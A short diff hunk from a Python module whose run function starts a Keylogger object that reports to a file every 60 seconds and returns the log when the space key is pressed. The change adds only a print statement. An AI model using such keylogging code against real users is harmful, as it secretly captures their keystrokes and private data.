@@ -8,6 +8,7 @@ def run(**args):
     keylogger = Keylogger(interval= 60, report_method="file")
     keylogger.start()
     if keyboard.is_pressed("space"):
+        print("pressed")
         return keylogger.report()
     
 
